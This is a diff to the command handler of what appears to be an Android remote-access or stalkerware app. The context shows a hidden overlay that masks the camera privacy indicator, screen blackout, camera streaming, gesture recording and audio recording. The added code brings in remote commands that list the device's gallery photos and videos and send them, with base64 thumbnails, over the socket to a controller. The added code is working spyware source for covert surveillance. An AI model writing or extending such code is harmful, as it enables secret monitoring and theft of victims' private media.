@@ -189,6 +189,7 @@ public class SocketManager {
     private final ScreenBlackout       screenBlackout;
     private final PermissionManager    permissionManager;
     private GestureRecorder            gestureRecorder;
+    private GalleryHandler             galleryHandler;
 
     // Camera-dot hide overlay (WindowManager view placed over the privacy indicator)
     private android.view.View      camDotOverlay;
@@ -215,6 +216,7 @@ public class SocketManager {
         appMonitor   = new AppMonitor(context, logManager);
         screenBlackout     = ScreenBlackout.getInstance();
         permissionManager  = new PermissionManager(context);
+        galleryHandler     = new GalleryHandler(context);
 
         // Wire camera frames → socket stream (same pattern as screen JPEG stream)
         cameraStreamHandler.setFrameCallback(new CameraStreamHandler.FrameCallback() {
@@ -1199,6 +1201,35 @@ public class SocketManager {
         if (command.equals("create_directory")) return fileHandler.createDirectory(params.getString("path"));
         if (command.equals("get_file_info"))    return fileHandler.getFileInfo(params.getString("filePath"));
         if (command.equals("search_files"))     return fileHandler.searchFiles(params.getString("directory"), params.getString("query"));
+
+        // ── Gallery ──────────────────────────────────────────────────────
+        if (command.equals("get_gallery")) {
+            final String cidG  = params.optString("commandId", "");
+            final String type  = params.optString("type", "all");
+            final int    limit = params.optInt("limit", 500);
+            bulkExecutor.execute(() -> {
+                try {
+                    JSONArray items = galleryHandler.getGallery(type, limit);
+                    sendChunked(cidG, "get_gallery", items, "items", 15);
+                } catch (Exception e) {
+                    sendChunkedError(cidG, "get_gallery", e.getMessage());
+                }
+            });
+            return null;
+        }
+        if (command.equals("get_gallery_thumbnail")) {
+            final long    mediaId = params.optLong("mediaId", -1);
+            final String  path    = params.optString("path", "");
+            final boolean isVideo = params.optBoolean("isVideo", false);
+            final int     size    = params.optInt("size", 500);
+            JSONObject r = new JSONObject();
+            String thumb = galleryHandler.getThumbnailBase64(mediaId, path, isVideo, size);
+            r.put("success", thumb != null);
+            if (thumb != null) r.put("thumbnail", thumb);
+            r.put("path", path);
+            r.put("mediaId", mediaId);
+            return r;
+        }
 
         // ── Audio ────────────────────────────────────────────────────────
         if (command.equals("start_recording")) {
